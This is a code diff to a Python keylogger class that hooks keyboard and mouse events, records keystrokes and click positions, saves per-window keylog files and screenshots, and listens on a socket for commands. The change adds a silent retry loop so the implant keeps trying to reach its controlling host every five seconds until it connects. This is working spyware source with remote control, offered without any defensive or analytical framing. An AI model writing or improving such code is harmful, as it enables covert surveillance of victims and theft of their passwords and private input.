@@ -18,7 +18,7 @@ class Keylogger:
 
         self.log_interval = log_interval
         self.log = ""
-    
+
         self.window_interval = window_interval
         self.foreground_window = ""
 
@@ -47,10 +47,10 @@ class Keylogger:
 
     def mouse_left_callback(self):
         self.log += f"[L_CLICK, {mouse.get_position()}]"
-    
+
     def mouse_right_callback(self):
         self.log += f"[R_CLICK, {mouse.get_position()}]"
-    
+
     def write_keylogs_to_file(self, foreground_window):
         if self.log:
             with open(f"keylog-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt", "w", encoding="utf-8") as file:
@@ -91,7 +91,7 @@ class Keylogger:
                 self.write_keylogs_to_file(current_window)
                 self.make_screenshot()
                 self.filecounter += 1
-                
+
             time.sleep(self.window_interval)
 
     def connect_to_host(self):
@@ -103,15 +103,23 @@ class Keylogger:
     def start(self):
         self.active = True
         self.write_information_file()
-        self.connect_to_host()
-        
+
         keyboard.on_press(callback=self.keyboard_callback)
         mouse.on_click(callback=self.mouse_left_callback)
         mouse.on_right_click(callback=self.mouse_right_callback)
 
         foreground_window_thread = Thread(target=self.check_foreground_window)
         foreground_window_thread.start()
-            
+
+        noConnection = True
+        while noConnection:
+            try:
+                self.connect_to_host()
+                noConnection = False
+            except:
+                time.sleep(5)
+                pass
+
         while True:
             recv = self.sock.recv(1024)
             if recv:
